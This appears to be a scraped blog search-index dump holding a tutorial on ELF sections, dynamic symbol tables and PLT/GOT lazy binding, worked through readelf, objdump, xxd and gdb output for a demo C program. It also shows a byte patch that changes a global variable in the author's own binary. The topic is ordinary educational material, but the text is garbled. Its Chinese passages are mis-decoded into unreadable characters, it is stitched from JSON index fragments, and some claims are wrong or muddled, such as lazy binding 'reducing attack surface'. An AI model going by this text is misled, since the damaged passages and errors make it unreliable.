(e.g., st_name). Use readelf -p .strtab demo to view its contents. It is not loaded at runtime but is crucial for linking and debugging. .shstrtab section åˆ†æ The .shstrtab section in an ELF file is the section header string table, which stores null-terminated strings representing the names of all sections in the binary. This section is critical for interpreting the section headers in the ELF file, as it allows tools like readelf, objdump, and debuggers to map numeric section indices to human-readable names (e.g., .text, .data, .bss). link æ—¶ä½¿ç”¨ã€‚è¿è¡Œæ—¶ä¸ä½¿ç”¨ã€‚\n.shstrtab section å­—æ®µè§£é‡Š [36] .shstrtab STRTAB 0000000000000000 00003bbd 000000000000016a 0000000000000000 0 0 1 Field Value Explanation Name .shstrtab Section header string table. Type STRTAB Indicates a string table. Address 0x0000000000000000 Not loaded into memory (no runtime use). Offset 0x00003bbd File offset to the start of the string table (15,277 bytes into the file). Size 0x000000000000016a (362 bytes) Total size of the string table. Entry Size 0x0000000000000000 Not applicable (strings are variable-length). Flags None No special flags (not allocated in memory). Link 0 Not linked to another section (standalone). Info 0 No additional metadata. Alignment 1 Byte-aligned (strings are stored contiguously). Key Concepts Purpose of .shstrtab:\nStores section names as null-terminated strings. Allows section headers to reference names via offsets instead of embedding strings directly. Example: A section header for .text has an sh_name field pointing to the offset of .text in .shstrtab. Structure of Strings:\nStrings are null-terminated (\\0). The first byte (offset 0x0) is always an empty string (\"\"), used as a placeholder. Subsequent strings are concatenated, e.g.: [0x00] \"\" \\0 [0x01] \".text\" \\0 [0x06] \".data\" \\0 [0x0c] \".bss\" \\0 ... How Section Headers Use .shstrtab\nEach section header has an sh_name field, which is an offset into .shstrtab. Example: A section header with sh_name = 0x01 points to the string .text. Not Loaded at Runtime:\nThe .shstrtab section is not marked as allocatable (A flag), so it is not loaded into memory during program execution. It is primarily used during linking and analysis. .shstrtab æ¢æ readelf -p: Print String Table readelf -p .shstrtab demo String dump of section '.shstrtab': [ 1] .symtab [ 9] .strtab [ 11] .shstrtab [ 1b] .interp [ 23] .note.gnu.property [ 36] .note.gnu.build-id [ 49] .note.ABI-tag [ 57] .gnu.hash [ 61] .dynsym [ 69] .dynstr [ 71] .gnu.version [ 7e] .gnu.version_r [ 8d] .rela.dyn [ 97] .rela.plt [ a1] .init [ a7] .plt.got [ b0] .plt.sec [ b9] .text [ bf] .fini [ c5] .rodata [ cd] .eh_frame_hdr [ db] .eh_frame [ e5] .init_array [ f1] .fini_array [ fd] .dynamic [ 106] .data [ 10c] .bss [ 111] .comment [ 11a] .debug_aranges [ 129] .debug_info [ 135] .debug_abbrev [ 143] .debug_line [ 14f] .debug_str [ 15a] .debug_line_str This lists all section names stored in .shstrtab, such as: .interp (dynamic linker path) .note.gnu.property (security notes) .text, .data, .bss, .rodata, .plt, .got, etc. .shstrtab äºŒè¿›åˆ¶æŸ¥çœ‹ xxd -s 0x3bbd -l 0x16a demo 00003bbd: 002e 7379 6d74 6162 002e 7374 7274 6162 ..symtab..strtab 00003bcd: 002e 7368 7374 7274 6162 002e 696e 7465 ..shstrtab..inte 00003bdd: 7270 002e 6e6f 7465 2e67 6e75 2e70 726f rp..note.gnu.pro 00003bed: 7065 7274 7900 2e6e 6f74 652e 676e 752e perty..note.gnu. 00003bfd: 6275 696c 642d 6964 002e 6e6f 7465 2e41 build-id..note.A 00003c0d: 4249 2d74 6167 002e 676e 752e 6861 7368 BI-tag..gnu.hash 00003c1d: 002e 6479 6e73 796d 002e 6479 6e73 7472 ..dynsym..dynstr 00003c2d: 002e 676e 752e 7665 7273 696f 6e00 2e67 ..gnu.version..g 00003c3d: 6e75 2e76 6572 7369 6f6e 5f72 002e 7265 nu.version_r..re 00003c4d: 6c61 2e64 796e 002e 7265 6c61 2e70 6c74 la.dyn..rela.plt 00003c5d: 002e 696e 6974 002e 706c 742e 676f 7400 ..init..plt.got. 00003c6d: 2e70 6c74 2e73 6563 002e 7465 7874 002e .plt.sec..text.. 00003c7d: 6669 6e69 002e 726f 6461 7461 002e 6568 fini..rodata..eh 00003c8d: 5f66 7261 6d65 5f68 6472 002e 6568 5f66 _frame_hdr..eh_f 00003c9d: 7261 6d65 002e 696e 6974 5f61 7272 6179 rame..init_array 00003cad: 002e 6669 6e69 5f61 7272 6179 002e 6479 ..fini_array..dy 00003cbd: 6e61 6d69 6300 2e64 6174 6100 2e62 7373 namic..data..bss 00003ccd: 002e 636f 6d6d 656e 7400 2e64 6562 7567 ..comment..debug 00003cdd: 5f61 7261 6e67 6573 002e 6465 6275 675f _aranges..debug_ 00003ced: 696e 666f 002e 6465 6275 675f 6162 6272 info..debug_abbr 00003cfd: 6576 002e 6465 6275 675f 6c69 6e65 002e ev..debug_line.. 00003d0d: 6465 6275 675f 7374 7200 2e64 6562 7567 debug_str..debug 00003d1d: 5f6c 696e 655f 7374 7200 _line_str. Why .shstrtab Matters Human-Readable Names:\nWithout .shstrtab, section headers would be numeric, making analysis harder. Efficient Storage:\nAvoids duplicating strings across section headers. Tool Compatibility:\nRequired by tools like readelf, objdump, and debuggers to interpret section headers. Binary Inspection:\nEssential for reverse engineering, debugging, and understanding ELF structure. .dynsym section åˆ†æ The .dynsym section in an ELF file is the dynamic symbol table, which contains symbols required for dynamic linking (e.g., external functions like printf from libc). This section is crucial for resolving symbols at runtime. è¿è¡Œæ—¶è§£æç¬¦å·ä½¿ç”¨\n.dynsym sectionå­—æ®µè§£é‡Š From your readelf -S demo output:\n[ 6] .dynsym DYNSYM 00000000000003d8 000003d8 00000000000000c0 0000000000000018 A 7 1 8 Field Value Explanation Name .dynsym Dynamic symbol table. Type DYNSYM Indicates a dynamic symbol table. Address 0x00000000000003d8 Virtual address in memory. Offset 0x000003d8 File offset to the start of the section. Size 0x00000000000000c0 (192 bytes) Total size in bytes. Entry Size 0x0000000000000018 (24 bytes) Size of each symbol entry. Flags A (Alloc) Section occupies memory during execution. Link 7 Index of the .dynstr section (holds symbol names). Info 1 Number of local symbols (e.g., UND symbols). Alignment 8 Alignment requirement for the section. link=7 é“¾æ¥åˆ° index = ã€7ã€‘çš„ section Key Concepts Purpose of .dynsym:\nStores symbols needed for dynamic linking, such as: External functions (e.g., printf, puts). Global variables from shared libraries. Symbols are resolved by the dynamic linker (ld-linux.so) at runtime. Unlike the full symbol table (.symtab), .dynsym is a subset optimized for runtime use. Structure of Entries: Each entry in .dynsym is 24 bytes (0x18) long, with fields like:\nName: Offset into .dynstr for the symbol name (e.g., \"printf\"). Value: Symbol address (0 for unresolved symbols). Size: Size of the symbol (0 for functions). Type \u0026 Binding: Metadata (e.g., FUNC GLOBAL DEFAULT UND). Visibility: Symbol visibility (default, hidden, etc.). .dynsym æŸ¥çœ‹ 1. readelf --dyn-syms readelf --dyn-syms demo Symbol table '.dynsym' contains 8 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _[...]@GLIBC_2.34 (2) 2: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.2.5 (3) 4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (3) 5: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 6: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 7: 0000000000000000 0 FUNC WEAK DEFAULT UND [...]@GLIBC_2.2.5 (3) 2. objdump -T objdump -T demo demo: file format elf64-x86-64 DYNAMIC SYMBOL TABLE: 0000000000000000 DF *UND* 0000000000000000 (GLIBC_2.34) __libc_start_main 0000000000000000 w D *UND* 0000000000000000 Base _ITM_deregisterTMCloneTable 0000000000000000 DF *UND* 0000000000000000 (GLIBC_2.2.5) puts 0000000000000000 DF *UND* 0000000000000000 (GLIBC_2.2.5) printf 0000000000000000 w D *UND* 0000000000000000 Base __gmon_start__ 0000000000000000 w D *UND* 0000000000000000 Base _ITM_registerTMCloneTable 0000000000000000 w DF *UND* 0000000000000000 (GLIBC_2.2.5) __cxa_finalize How .dynsym Works in Dynamic Linking Symbol Resolution:\nThe dynamic linker uses .dynsym entries to locate symbols in shared libraries (e.g., printf in libc). Each symbol has a name (from .dynstr) and metadata (type, binding). Lazy Binding:\nWhen printf is first called, the PLT stub jumps to the GOT entry (.got). The GOT entry initially points to the resolver (in .plt), which triggers the dynamic linker to resolve the symbol. The dynamic linker uses .dynsym to look up printf and updates the GOT entry with its address in libc. Key Sections Involved:\n.dynsym: Contains unresolved symbols (e.g., printf). .dynstr: String table for symbol names (linked via .dynsymâ€™s Link field). .rela.plt: Relocations for PLT entries (e.g., printfâ€™s GOT offset). .got: Stores resolved addresses after dynamic linking. ","lazy-binding-æ˜¯æ€æ ·å·¥ä½œçš„#lazy binding æ˜¯æ€æ ·å·¥ä½œçš„?":"demo æ‰§è¡Œæµç¨‹ The kernel loads /lib64/ld-linux-x86-64.so.2 (the dynamic linker). The dynamic linker loads libc.so.6 (used by printf). It resolves printf in libc and updates the GOT. Constructor initialize() runs before main(). Destructor finalize() runs after main() exits. lazy binding for the printf function in your code, using the readelf output and ELF mechanics. This process involves the Procedure Linkage Table (PLT), Global Offset Table (GOT), and the dynamic linker.\n1. Key Sections Involved Section Address Purpose .plt 0x1020 Stubs for external function calls (e.g., printf). .got 0x3fb0 Stores resolved addresses of external symbols. .rela.plt 0x678 Relocations for PLT entries (e.g., printf). .dynsym 0x3d8 Dynamic symbol table (includes unresolved symbols like printf). 2. Lazy Binding Workflow Lazy binding defers symbol resolution until the first call. Hereâ€™s how printf is resolved:\nStep 1: Initial Call to printf When print_message() calls printf, it jumps to the PLT entry for printf: print_message() { printf(\"%s\\n\", message); // Jumps to PLT entry for printf } Step 2: PLT Entry for printf The .plt section contains a stub for printf.\n0x1020: jmp *0x2f90(%rip) # Jump to GOT entry for printf 0x1026: pushq $0x0 # Argument for resolver 0x102b: jmp 0x1000 # Jump to dynamic linker resolver The GOT entry (0x3fb0 + offset) initially points to the resolver code in .plt.\nStep 3: Dynamic Linker Resolves printf The resolver (in .plt) calls the dynamic linker (ld-linux-x86-64.so.2) to: Look up printf in the symbol table (.symtab, .dynsym). Find the address of printf in libc.so.6. Update the GOT entry to point directly to libcâ€™s printf. Step 4: Subsequent Calls to printf After resolution, the GOT entry points directly to libcâ€™s printf, bypassing the resolver: 0x1020: jmp *0x2f90(%rip) # Now jumps directly to libc's printf 3. Observing Lazy Binding in Your Code Step 1: Find the PLT/GOT Entry for printf From readelf -s demo:\nSymbol table '.symtab' contains 46 entries: ... 30: 0000000000000000 0 FUNC GLOBAL DEFAULT UND printf@GLIBC_2.2.5 printf is an undefined symbol (UND), meaning it will be resolved dynamically. From readelf -r demo (relocations):\nRelocation section '.rela.plt' at offset 0x678 contains 2 entries: Offset Info Type Sym. Value Sym. Name + Addend 0x3fb8 0x0000000000020007 R_X86_64_JUMP_SLOT 0 printf + 0 The GOT entry at 0x3fb8 will hold the resolved address of printf. Step 2: Use gdb to Trace Lazy Binding Run the program in GDB: gdb ./demo Set a breakpoint at the PLT entry for printf: (gdb) break *0x1020 # First PLT entry (for printf) (gdb) run First call to printf: The program stops at 0x1020 (PLT stub). Step into the resolver: (gdb) stepi =\u003e 0x1026: pushq $0x0 # Push relocation index (gdb) stepi =\u003e 0x102b: jmp 0x1000 # Jump to resolver (dynamic linker) After resolution: The GOT entry at 0x3fb8 is updated to libcâ€™s printf address: (gdb) x/gx 0x3fb8 0x3fb8: 0x7ffff7e12345 # Address of printf in libc Step 3: Verify with objdump Disassemble the .plt section:\nobjdump -d demo | grep -A 10 '\u003cprintf@plt\u003e' Output:\n0000000000001020 \u003cprintf@plt\u003e: 1020: ff 25 90 2f 00 00 jmpq *0x2f90(%rip) # 0x3fb8 \u003cprintf@got\u003e 1026: 68 00 00 00 00 pushq $0x0 102b: e9 d0 ff ff ff jmpq 1000 \u003c.plt\u003e The first jmpq jumps to the GOT entry at 0x3fb8. The second instruction pushes the relocation index for printf. 4. Summary of Lazy Binding Steps Initial Call:\nprintf â†’ .plt stub â†’ .got entry (points to resolver). Resolver Invoked:\nResolver calls dynamic linker to resolve printf in libc. GOT Updated:\nDynamic linker writes libcâ€™s printf address to .got. Subsequent Calls:\n.plt â†’ .got â†’ libcâ€™s printf directly. 5. Why Lazy Binding Matters Performance: Avoids resolving all symbols upfront. Memory Efficiency: Only resolves symbols that are actually used. Security: Reduces attack surface by deferring resolution. ","shstrtab-section-åˆ†æ#\u003ccode\u003e.shstrtab section\u003c/code\u003e åˆ†æ":"","strtab-section-åˆ†æ#\u003ccode\u003e.strtab section\u003c/code\u003e åˆ†æ":"","symbol-table-ç¬¦å·è¡¨åˆ†æ#symbol table ç¬¦å·è¡¨åˆ†æ":""},"title":"Master Elf Sections Dynamic Link"},"/blog/master-elf-sections/":{"data":{"":"","bss-section-åˆ†æ#\u003ccode\u003e.bss\u003c/code\u003e section åˆ†æ":"","data-section-åˆ†æ#\u003ccode\u003e.data\u003c/code\u003e section åˆ†æ":"","databssrodatatext#dataã€bssã€rodataã€text":" dataã€rodataã€text åœ¨ demo ä¸­ä½ç½®å…³ç³»","elf-linking-view-åˆ†æ#ELF (linking view) åˆ†æ":"","readelf--s-section-headers#readelf -S (section headers)":"","readelf--t-display-the-section-details#readelf -t (Display the section details)":"","rodata-section-åˆ†æ#\u003ccode\u003e.rodata\u003c/code\u003e section åˆ†æ":" åˆ†æç¯å¢ƒ mint21\nELF (linking view) åˆ†æ ä¸€ä¸ª ELF æ–‡ä»¶æœ‰å¤šç§ viewã€‚ ä» linking è§†è§’æ¥ç†è§£ sections åˆ°åº•æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ æºä»£ç çš„å„ä¸ªä¸åŒçš„éƒ¨åˆ†ç¼–è¯‘åéƒ½è¢«æ”¾åˆ°äº†å“ªä¸ª sectionã€‚ æœ¬æ–‡ä¸»è¦åˆ†æ rodata text data bss è¿™ 4 ä¸ª sectionã€‚ ç¤ºä¾‹ä»£ç  gcc -g -o demo demo.c\nç¼–è¯‘åçš„å„ä¸ªæ–‡ä»¶\ndemo.c#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e // Global variable (initialized) â†’ .data int global_data = 42; // Global variable (uninitialized) â†’ .bss int global_bss; // Constant string â†’ .rodata const char *message = \"Hello from .rodata!\"; // Static local variable â†’ gcc stored in .bss (not .bss, = 0 it's uninitialized) void counter() { static int count = 0; count++; printf(\"Counter: %d\\n\", count); } // Destructor function â†’ .fini_array __attribute__((destructor)) void finalize() { printf(\"Finalizing...\\n\"); } // Constructor function â†’ .init_array __attribute__((constructor)) void initialize() { printf(\"Initializing...\\n\"); } // Function in .text void print_message() { printf(\"%s\\n\", message); // Uses PLT/GOT for printf } int main() { // Local static variable â†’ stored in .data (initialized) static int local_static = 100; printf(\"Global Data: %d\\n\", global_data); printf(\"Global BSS: %d\\n\", global_bss); printf(\"Local Static: %d\\n\", local_static); print_message(); for (int i = 0; i \u003c 3; i++) { counter(); // Modifies static variable in .data } return 0; } readelf -h æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Position-Independent Executable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x1080 Start of program headers: 64 (bytes into file) Start of section headers: 15656 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 13 Size of section headers: 64 (bytes) Number of section headers: 37 Section header string table index: 36 header ä¿¡æ¯ æ³¨æ„ Data: 2â€™s complement, little endian æ³¨æ„: ä½¿ç”¨çš„æ˜¯å°ç«¯ã€‚æ•°æ®é«˜ä½åœ¨é«˜åœ°å€ Number of section headers: 37 ä¸€å…± 37 ä¸ª section readelf -t (Display the section details) There are 37 section headers, starting at offset 0x3d28: Section Headers: [Nr] Name Type Address Offset Link Size EntSize Info Align Flags [ 0] NULL 0000000000000000 0000000000000000 0 0000000000000000 0000000000000000 0 0 [0000000000000000]: [ 1] .interp PROGBITS 0000000000000318 0000000000000318 0 000000000000001c 0000000000000000 0 1 [0000000000000002]: ALLOC [ 2] .note.gnu.property NOTE 0000000000000338 0000000000000338 0 0000000000000030 0000000000000000 0 8 [0000000000000002]: ALLOC [ 3] .note.gnu.build-id NOTE 0000000000000368 0000000000000368 0 0000000000000024 0000000000000000 0 4 [0000000000000002]: ALLOC [ 4] .note.ABI-tag NOTE 000000000000038c 000000000000038c 0 0000000000000020 0000000000000000 0 4 [0000000000000002]: ALLOC [ 5] .gnu.hash GNU_HASH 00000000000003b0 00000000000003b0 6 0000000000000024 0000000000000000 0 8 [0000000000000002]: ALLOC [ 6] .dynsym DYNSYM 00000000000003d8 00000000000003d8 7 00000000000000c0 0000000000000018 1 8 [0000000000000002]: ALLOC [ 7] .dynstr STRTAB 0000000000000498 0000000000000498 0 0000000000000094 0000000000000000 0 1 [0000000000000002]: ALLOC [ 8] .gnu.version VERSYM 000000000000052c 000000000000052c 6 0000000000000010 0000000000000002 0 2 [0000000000000002]: ALLOC [ 9] .gnu.version_r VERNEED 0000000000000540 0000000000000540 7 0000000000000030 0000000000000000 1 8 [0000000000000002]: ALLOC [10] .rela.dyn RELA 0000000000000570 0000000000000570 6 0000000000000108 0000000000000018 0 8 [0000000000000002]: ALLOC [11] .rela.plt RELA 0000000000000678 0000000000000678 6 0000000000000030 0000000000000018 24 8 [0000000000000042]: ALLOC, INFO LINK [12] .init PROGBITS 0000000000001000 0000000000001000 0 000000000000001b 0000000000000000 0 4 [0000000000000006]: ALLOC, EXEC [13] .plt PROGBITS 0000000000001020 0000000000001020 0 0000000000000030 0000000000000010 0 16 [0000000000000006]: ALLOC, EXEC [14] .plt.got PROGBITS 0000000000001050 0000000000001050 0 0000000000000010 0000000000000010 0 16 [0000000000000006]: ALLOC, EXEC [15] .plt.sec PROGBITS 0000000000001060 0000000000001060 0 0000000000000020 0000000000000010 0 16 [0000000000000006]: ALLOC, EXEC [16] .text PROGBITS 0000000000001080 0000000000001080 0 00000000000001fb 0000000000000000 0 16 [0000000000000006]: ALLOC, EXEC [17] .fini PROGBITS 000000000000127c 000000000000127c 0 000000000000000d 0000000000000000 0 4 [0000000000000006]: ALLOC, EXEC [18] .rodata PROGBITS 0000000000002000 0000000000002000 0 0000000000000076 0000000000000000 0 4 [0000000000000002]: ALLOC [19] .eh_frame_hdr PROGBITS 0000000000002078 0000000000002078 0 0000000000000054 0000000000000000 0 4 [0000000000000002]: ALLOC [20] .eh_frame PROGBITS 00000000000020d0 00000000000020d0 0 000000000000012c 0000000000000000 0 8 [0000000000000002]: ALLOC [21] .init_array INIT_ARRAY 0000000000003da0 0000000000002da0 0 0000000000000010 0000000000000008 0 8 [0000000000000003]: WRITE, ALLOC [22] .fini_array FINI_ARRAY 0000000000003db0 0000000000002db0 0 0000000000000010 0000000000000008 0 8 [0000000000000003]: WRITE, ALLOC [23] .dynamic DYNAMIC 0000000000003dc0 0000000000002dc0 7 00000000000001f0 0000000000000010 0 8 [0000000000000003]: WRITE, ALLOC [24] .got PROGBITS 0000000000003fb0 0000000000002fb0 0 0000000000000050 0000000000000008 0 8 [0000000000000003]: WRITE, ALLOC [25] .data PROGBITS 0000000000004000 0000000000003000 0 0000000000000020 0000000000000000 0 8 [0000000000000003]: WRITE, ALLOC [26] .bss NOBITS 0000000000004020 0000000000003020 0 0000000000000010 0000000000000000 0 4 [0000000000000003]: WRITE, ALLOC [27] .comment PROGBITS 0000000000000000 0000000000003020 0 000000000000002b 0000000000000001 0 1 [0000000000000030]: MERGE, STRINGS [28] .debug_aranges PROGBITS 0000000000000000 000000000000304b 0 0000000000000030 0000000000000000 0 1 [0000000000000000]: [29] .debug_info PROGBITS 0000000000000000 000000000000307b 0 00000000000001ae 0000000000000000 0 1 [0000000000000000]: [30] .debug_abbrev PROGBITS 0000000000000000 0000000000003229 0 00000000000000e8 0000000000000000 0 1 [0000000000000000]: [31] .debug_line PROGBITS 0000000000000000 0000000000003311 0 00000000000000a2 0000000000000000 0 1 [0000000000000000]: [32] .debug_str PROGBITS 0000000000000000 00000000000033b3 0 000000000000013e 0000000000000001 0 1 [0000000000000030]: MERGE, STRINGS [33] .debug_line_str PROGBITS 0000000000000000 00000000000034f1 0 0000000000000030 0000000000000001 0 1 [0000000000000030]: MERGE, STRINGS [34] .symtab SYMTAB 0000000000000000 0000000000003528 35 0000000000000450 0000000000000018 20 8 [0000000000000000]: [35] .strtab STRTAB 0000000000000000 0000000000003978 0 0000000000000245 0000000000000000 0 1 [0000000000000000]: [36] .shstrtab STRTAB 0000000000000000 0000000000003bbd 0 000000000000016a 0000000000000000 0 1 [0000000000000000]: readelf -S (section headers) There are 37 section headers, starting at offset 0x3d28: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .interp PROGBITS 0000000000000318 00000318 000000000000001c 0000000000000000 A 0 0 1 [ 2] .note.gnu.pr[...] NOTE 0000000000000338 00000338 0000000000000030 0000000000000000 A 0 0 8 [ 3] .note.gnu.bu[...] NOTE 0000000000000368 00000368 0000000000000024 0000000000000000 A 0 0 4 [ 4] .note.ABI-tag NOTE 000000000000038c 0000038c 0000000000000020 0000000000000000 A 0 0 4 [ 5] .gnu.hash GNU_HASH 00000000000003b0 000003b0 0000000000000024 0000000000000000 A 6 0 8 [ 6] .dynsym DYNSYM 00000000000003d8 000003d8 00000000000000c0 0000000000000018 A 7 1 8 [ 7] .dynstr STRTAB 0000000000000498 00000498 0000000000000094 0000000000000000 A 0 0 1 [ 8] .gnu.version VERSYM 000000000000052c 0000052c 0000000000000010 0000000000000002 A 6 0 2 [ 9] .gnu.version_r VERNEED 0000000000000540 00000540 0000000000000030 0000000000000000 A 7 1 8 [10] .rela.dyn RELA 0000000000000570 00000570 0000000000000108 0000000000000018 A 6 0 8 [11] .rela.plt RELA 0000000000000678 00000678 0000000000000030 0000000000000018 AI 6 24 8 [12] .init PROGBITS 0000000000001000 00001000 000000000000001b 0000000000000000 AX 0 0 4 [13] .plt PROGBITS 0000000000001020 00001020 0000000000000030 0000000000000010 AX 0 0 16 [14] .plt.got PROGBITS 0000000000001050 00001050 0000000000000010 0000000000000010 AX 0 0 16 [15] .plt.sec PROGBITS 0000000000001060 00001060 0000000000000020 0000000000000010 AX 0 0 16 [16] .text PROGBITS 0000000000001080 00001080 00000000000001fb 0000000000000000 AX 0 0 16 [17] .fini PROGBITS 000000000000127c 0000127c 000000000000000d 0000000000000000 AX 0 0 4 [18] .rodata PROGBITS 0000000000002000 00002000 0000000000000076 0000000000000000 A 0 0 4 [19] .eh_frame_hdr PROGBITS 0000000000002078 00002078 0000000000000054 0000000000000000 A 0 0 4 [20] .eh_frame PROGBITS 00000000000020d0 000020d0 000000000000012c 0000000000000000 A 0 0 8 [21] .init_array INIT_ARRAY 0000000000003da0 00002da0 0000000000000010 0000000000000008 WA 0 0 8 [22] .fini_array FINI_ARRAY 0000000000003db0 00002db0 0000000000000010 0000000000000008 WA 0 0 8 [23] .dynamic DYNAMIC 0000000000003dc0 00002dc0 00000000000001f0 0000000000000010 WA 7 0 8 [24] .got PROGBITS 0000000000003fb0 00002fb0 0000000000000050 0000000000000008 WA 0 0 8 [25] .data PROGBITS 0000000000004000 00003000 0000000000000020 0000000000000000 WA 0 0 8 [26] .bss NOBITS 0000000000004020 00003020 0000000000000010 0000000000000000 WA 0 0 4 [27] .comment PROGBITS 0000000000000000 00003020 000000000000002b 0000000000000001 MS 0 0 1 [28] .debug_aranges PROGBITS 0000000000000000 0000304b 0000000000000030 0000000000000000 0 0 1 [29] .debug_info PROGBITS 0000000000000000 0000307b 00000000000001ae 0000000000000000 0 0 1 [30] .debug_abbrev PROGBITS 0000000000000000 00003229 00000000000000e8 0000000000000000 0 0 1 [31] .debug_line PROGBITS 0000000000000000 00003311 00000000000000a2 0000000000000000 0 0 1 [32] .debug_str PROGBITS 0000000000000000 000033b3 000000000000013e 0000000000000001 MS 0 0 1 [33] .debug_line_str PROGBITS 0000000000000000 000034f1 0000000000000030 0000000000000001 MS 0 0 1 [34] .symtab SYMTAB 0000000000000000 00003528 0000000000000450 0000000000000018 35 20 8 [35] .strtab STRTAB 0000000000000000 00003978 0000000000000245 0000000000000000 0 0 1 [36] .shstrtab STRTAB 0000000000000000 00003bbd 000000000000016a 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) .data section åˆ†æ [25] .data PROGBITS 0000000000004000 00003000 0000000000000020 0000000000000000 WA 0 0 8 .data section å­—æ®µè§£é‡Š Field Value Meaning [25] Section Index The 25th section in the ELF file. Used internally by tools like readelf. .data Section Name Holds initialized global/static variables (e.g., global_data, local_static, message). PROGBITS Section Type Contains raw data (code, initialized data) stored in the file. Not dynamically generated at runtime. 0000000000004000 Virtual Address (VA) At runtime, this section will be mapped to virtual address 0x4000 in memory. 00003000 File Offset In the file (demo), this section starts at byte offset 0x3000 (12288 in decimal). 0000000000000020 Size Size of the section in bytes: 0x20 (32 bytes). Spans from 0x3000 to 0x3020 in the file. 0000000000000000 Entry Size (EntSize) If the section contains fixed-size entries (e.g., symbol tables), this specifies their size. Here itâ€™s 0 â†’ no fixed-size entries. WA Flags Section attributes: W = Writable (memory can be modified at runtime).\nA = Allocated (loaded into memory during execution). No X â†’ this section is not executable. 0 Link Relates to other sections; used for symbol tables or relocation (value 0 here = unused). 0 Info Extra information (e.g., section index of related section); unused here. 8 Alignment Memory alignment requirement: must start at an address divisible by 8. Key Takeaways Virtual Address (VA): 0x4000\nAt runtime, the .data section is mapped to virtual address 0x4000. This is a runtime memory address, not a file offset. Example: Your message variable is located at 0x4000 + 0x18 = 0x4018. File Offset: 0x3000\nIn the file (demo), the .data section starts at byte 12288 (hex 0x3000). Since the file size is 16320 bytes (~0x4000), this offset is valid. Size: 0x20 (32 bytes)\nThe section spans 32 bytes on disk (0x3000 to 0x3020) and in memory (0x4000 to 0x4020). Flags: WA (Writable + Allocated)\nThe OS loads this section into memory with write permissions. You can modify variables like global_data at runtime. Alignment: 8\nEnsures efficient memory access by aligning the section to 8-byte boundaries. æŸ¥çœ‹ demo ä¸­ 0x3000(.data) å 0x20(32) å­—èŠ‚çš„å†…å®¹ xxd -l 32 -s 0x3000 demo 00003000: 0000 0000 0000 0000 0840 0000 0000 0000 .........@...... 00003010: 2a00 0000 6400 0000 0420 0000 0000 0000 *...d.... ...... global variable ä¹‹ message åˆ†æ const char *message = \"Hello from .rodata!\"; message ç¬¦å·ä¿¡æ¯ nm demo | grep message 0000000000004018 D message 00000000000011d3 T print_message message is a pointer variable stored in .data. message virtual address = 0x4018 data section ä¸­çš„ virtual address, message offset = VA(message) - VA(start of .data) = 0x4018 - 0x4000 = 0x18 message è¿™ä¸ª global variable çš„æŒ‡é’ˆåœ¨ demo çš„ offset æ˜¯ 0x000003000 + 0x18 = 0x3018 å¯çŸ¥ 0x3018 å¤„ 8 å­—èŠ‚çš„å†…å®¹ä¸º 0420 0000 0000 0000 ELF å°ç«¯å­˜å‚¨, æ‰€ä»¥å€¼ä¸º 0x2004, è¿™å°±æ˜¯ message å˜é‡çš„å€¼ æŸ¥æ‰¾ message å­—ç¬¦ä¸²å†…å®¹ xxd demo | grep -A 1 \"Hello from\" 00002000: 0100 0200 4865 6c6c 6f20 6672 6f6d 202e ....Hello from . 00002010: 726f 6461 7461 2100 436f 756e 7465 723a rodata!.Counter: å¯çŸ¥ Hello from .rodata! è¿™ä¸€ä¸²å­—ç¬¦æ‰€åœ¨æ–‡ä»¶ offset = 0x00002004 è¿™å°±æ˜¯ data section ä¸­ global variable message æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸² æŸ¥æ‰¾ message å­—ç¬¦ä¸²å†…å®¹åœ¨ä½•å¤„? åœ¨ .rodata åªè¯»æ•°æ® section ä¸­\n[18] .rodata PROGBITS 0000000000002000 00002000 0000000000000076 0000000000000000 A 0 0 4 initialized global variable ä¹‹ global_data global_data ç¬¦å·ä¿¡æ¯ nm demo | grep global_data 0000000000004010 D global_data 00003000: 0000 0000 0000 0000 0840 0000 0000 0000 .........@...... 00003010: 2a00 0000 6400 0000 0420 0000 0000 0000 *...d.... ...... global_data offset = VA(message) - VA(start of .data) = 0x4010 - 0x4000 = 0x10 global_data è¿™ä¸ª global variable çš„æŒ‡é’ˆåœ¨ demo çš„ offset æ˜¯ 0x000003000 + 0x10 = 0x3010 int global_data ä¸º 4bytesã€‚2a00 0000 è½¬ä¸ºå°ç«¯ 0x0000002a, å°±æ˜¯ 42 æ›¿æ¢ global_data çš„å€¼ ä½¿ç”¨è„šæœ¬update.sh\næ“çºµ demo æ–‡ä»¶ä¸­ offset = 0x3010 è¿™ 1 ä¸ª byteã€‚ğŸ¤£ global_data é‡æ–°è®¾ç½®ä¸º 0xff\n./demo Initializing... Global Data: 42 Global BSS: 0 Local Static: 100 Hello from .rodata! Counter: 1 Counter: 2 Counter: 3 Finalizing... ./update.sh demo 0x3010 0xff Updated byte at offset 12304 (0x3010) to 0xff ./demo Initializing... Global Data: 255 #ğŸ¤£ğŸ¤£ğŸ¤£ï¼Œè¿™å°±æ˜¯é€†å‘ã€‚ Global BSS: 0 Local Static: 100 Hello from .rodata! Counter: 1 Counter: 2 Counter: 3 Finalizing... æ“çºµ demo æ–‡ä»¶ä¸­ offset = (0x3010,0x3013) 